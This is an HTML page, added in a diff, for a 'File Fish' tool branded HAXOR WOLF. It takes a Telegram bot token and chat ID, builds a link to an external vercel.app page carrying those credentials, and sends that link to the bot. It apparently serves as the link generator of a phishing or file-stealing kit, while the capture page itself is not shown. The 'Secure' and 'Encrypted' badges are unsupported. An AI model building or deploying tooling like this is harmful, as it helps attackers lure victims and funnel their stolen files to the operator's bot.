@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>File Fish · HAXOR WOLD</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root { --primary: #ef4444; --secondary: #eab308; --dark: #0f172a; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Outfit', sans-serif;
+            background-color: var(--dark);
+            overflow-x: hidden;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .glass-panel {
+            background: rgba(30, 41, 59, 0.6);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+        }
+        .gradient-text {
+            background: linear-gradient(135deg, #ef4444 0%, #fbbf24 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .fade-in {
+            animation: fadeIn 0.8s ease-out forwards;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .blob {
+            position: absolute;
+            filter: blur(90px);
+            z-index: -1;
+            opacity: 0.25;
+        }
+        .shimmer-card {
+            position: relative;
+            overflow: hidden;
+        }
+        .shimmer-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -150%;
+            width: 50%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            transform: skewX(-20deg);
+            animation: shimmer 3s infinite;
+        }
+        @keyframes shimmer {
+            100% { left: 150%; }
+        }
+        .input-box {
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            background: rgba(0,0,0,0.4);
+            border: 1px solid rgba(255,255,255,0.15);
+            color: white;
+            margin-bottom: 12px;
+            outline: none;
+            transition: 0.3s;
+            font-size: 1rem;
+            font-family: 'Outfit', sans-serif;
+        }
+        .input-box:focus {
+            border-color: #ef4444;
+            box-shadow: 0 0 15px rgba(239,68,68,0.2);
+            background: rgba(0,0,0,0.6);
+        }
+        .input-box::placeholder { color: rgba(255,255,255,0.3); }
+
+        .btn-gradient {
+            background: linear-gradient(135deg, #ef4444, #eab308);
+            transition: all 0.3s ease;
+        }
+        .btn-gradient:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(239,68,68,0.3);
+        }
+        .btn-gradient:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .wa-float {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            z-index: 50;
+        }
+        .wa-float .wa-btn {
+            background: #25D366;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 30px;
+            box-shadow: 0 0 20px rgba(37,211,102,0.6);
+            transition: 0.3s;
+            text-decoration: none;
+        }
+        .wa-float .wa-btn:hover { transform: scale(1.05); }
+
+        .spinner {
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .wa-float { bottom: 20px; right: 20px; }
+            .wa-float .wa-btn { width: 50px; height: 50px; font-size: 24px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Background Blobs -->
+    <div class="blob bg-red-600 w-96 h-96 rounded-full top-[-10%] left-[-5%]"></div>
+    <div class="blob bg-yellow-500 w-96 h-96 rounded-full bottom-[10%] right-[-5%]"></div>
+    <div class="blob bg-purple-600 w-72 h-72 rounded-full top-[40%] left-[40%] opacity-10"></div>
+
+    <!-- WhatsApp Float -->
+    <div class="wa-float">
+        <a href="https://t.me/haxorwolf" target="_blank" class="wa-btn">
+            <i class="fa-brands fa-telegram"></i>
+        </a>
+    </div>
+
+    <!-- Navigation -->
+    <nav class="fixed w-full z-50 glass-panel border-b-0" style="top:0; left:0;">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <div class="flex items-center gap-3 cursor-pointer transition">
+                <div class="w-10 h-10 bg-gradient-to-tr from-red-600 to-yellow-500 rounded-lg flex items-center justify-center text-white font-bold text-xl shadow-lg">
+                    <i class="fa-solid fa-fish"></i>
+                </div>
+                <span class="font-extrabold text-xl tracking-wide">HAXOR<span class="text-yellow-500"> WOLF</span></span>
+            </div>
+            <div class="flex items-center gap-2">
+                <span class="text-xs text-gray-400 bg-white/5 px-3 py-1.5 rounded-full border border-white/5">FILE FISH</span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="flex-grow flex items-center justify-center pt-32 pb-12 px-6">
+        <div class="max-w-4xl w-full fade-in" style="animation-delay: 0.2s;">
+
+            <!-- Header -->
+            <div class="text-center mb-10">
+                <span class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-bold uppercase tracking-widest shadow-inner mb-4">
+                    <span class="relative flex h-2 w-2"><span class="relative h-2 w-2 rounded-full bg-red-500"></span></span>
+                    HAXOR WOLD TOOLS
+                </span>
+                <h1 class="text-4xl md:text-5xl font-extrabold leading-tight">
+                    <span class="gradient-text">File Fish</span>
+                </h1>
+                <p class="text-gray-400 text-lg mt-2">Generate a link using your bot token and chat ID</p>
+            </div>
+
+            <!-- Main Card -->
+            <div class="glass-panel p-8 md:p-10 rounded-3xl shimmer-card border-t-4 border-yellow-500 relative">
+                <div class="absolute top-0 right-0 w-32 h-32 bg-red-500/10 rounded-full blur-3xl"></div>
+
+                <form id="fishForm" class="flex flex-col gap-4">
+                    <div>
+                        <label class="text-sm font-semibold text-gray-300 mb-2 block"><i class="fa-solid fa-robot text-red-400 mr-2"></i> Telegram Bot Token</label>
+                        <input type="text" id="botToken" class="input-box" placeholder="e.g., 8370907154:AAExqwz9gYBbC9lD142JJszV7OoH3cBPDFc" required>
+                    </div>
+                    <div>
+                        <label class="text-sm font-semibold text-gray-300 mb-2 block"><i class="fa-regular fa-comment-dots text-yellow-400 mr-2"></i> Chat ID</label>
+                        <input type="text" id="chatId" class="input-box" placeholder="e.g., 7831958199" required>
+                    </div>
+                    <button type="submit" id="submitBtn" class="w-full py-4 btn-gradient rounded-xl font-extrabold text-lg flex items-center justify-center gap-3 shadow-[0_5px_20px_rgba(239,68,68,0.4)] text-white">
+                        <span>SEND LINK</span>
+                        <i id="spinnerIcon" class="fa-solid fa-circle-notch spinner text-xl"></i>
+                    </button>
+                </form>
+
+                <!-- Status Message -->
+                <div id="statusMessage" class="mt-6 text-center text-sm font-medium min-h-[30px] transition-all"></div>
+            </div>
+
+            <!-- Footer Info -->
+            <div class="text-center mt-8 text-gray-500 text-xs flex flex-wrap justify-center gap-4">
+                <span><i class="fa-solid fa-shield-halved text-yellow-500 mr-1"></i> Secure</span>
+                <span><i class="fa-solid fa-bolt text-red-400 mr-1"></i> Fast</span>
+                <span><i class="fa-solid fa-lock text-green-400 mr-1"></i> Encrypted</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-gray-900/50 backdrop-blur-sm py-6 border-t border-gray-800 mt-auto relative z-10">
+        <div class="container mx-auto px-4 text-center">
+            <p class="text-gray-400 text-sm">© 2025 <span class="font-bold text-white">HAXOR WOLF</span>. All Rights Reserved.</p>
+            <div class="flex justify-center gap-6 mt-3 text-gray-500 text-xl">
+                <a href="https://t.me/haxorwolf" target="_blank" class="hover:text-green-500 transition"><i class="fa-brands fa-whatsapp"></i></a>
+                <a href="https://t.me/haxorwolf" target="_blank" class="hover:text-blue-400 transition"><i class="fa-brands fa-telegram"></i></a>
+                <a href="#" target="_blank" class="hover:text-red-500 transition"><i class="fa-brands fa-youtube"></i></a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // ============================================================
+        // DOM REFS
+        // ============================================================
+        const form = document.getElementById('fishForm');
+        const botTokenInput = document.getElementById('botToken');
+        const chatIdInput = document.getElementById('chatId');
+        const statusDiv = document.getElementById('statusMessage');
+        const submitBtn = document.getElementById('submitBtn');
+        const spinner = document.getElementById('spinnerIcon');
+
+        // ============================================================
+        // SEND LINK FUNCTION
+        // ============================================================
+        function buildAndSendLink(token, chatId) {
+            const base = 'https://faile-fish.vercel.app/';
+            const url = `${base}?token=${encodeURIComponent(token)}&id=${encodeURIComponent(chatId)}`;
+
+            statusDiv.innerHTML = '<span class="text-yellow-400"><i class="fa-solid fa-spinner fa-spin mr-2"></i> Sending link to your bot...</span>';
+            statusDiv.style.color = '#fbbf24';
+
+            const message = `🔗 Your link: ${url}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    disable_web_page_preview: false,
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) {
+                    statusDiv.innerHTML = '<span class="text-green-400"><i class="fa-solid fa-circle-check mr-2"></i> Link sent successfully! Check your bot.</span>';
+                    statusDiv.style.color = '#34d399';
+                } else {
+                    statusDiv.innerHTML = `<span class="text-red-400"><i class="fa-solid fa-circle-xmark mr-2"></i> Failed: ${data.description || 'Unknown error'}</span>`;
+                    statusDiv.style.color = '#ef4444';
+                }
+            })
+            .catch(err => {
+                statusDiv.innerHTML = `<span class="text-red-400"><i class="fa-solid fa-circle-xmark mr-2"></i> Network error: ${err.message}</span>`;
+                statusDiv.style.color = '#ef4444';
+            });
+        }
+
+        // ============================================================
+        // FORM SUBMIT
+        // ============================================================
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const token = botTokenInput.value.trim();
+            const chatId = chatIdInput.value.trim();
+
+            if (!token || !chatId) {
+                statusDiv.innerHTML = '<span class="text-red-400"><i class="fa-solid fa-circle-xmark mr-2"></i> Please provide both Token and Chat ID!</span>';
+                statusDiv.style.color = '#ef4444';
+                return;
+            }
+
+            if (!token.includes(':')) {
+                statusDiv.innerHTML = '<span class="text-red-400"><i class="fa-solid fa-circle-xmark mr-2"></i> Invalid token format (example: 123:ABC...)</span>';
+                statusDiv.style.color = '#ef4444';
+                return;
+            }
+
+            // Show loading state
+            submitBtn.disabled = true;
+            submitBtn.style.opacity = '0.7';
+            spinner.style.display = 'inline-block';
+
+            buildAndSendLink(token, chatId);
+
+            // Reset after 3 seconds
+            setTimeout(() => {
+                submitBtn.disabled = false;
+                submitBtn.style.opacity = '1';
+                spinner.style.display = 'none';
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
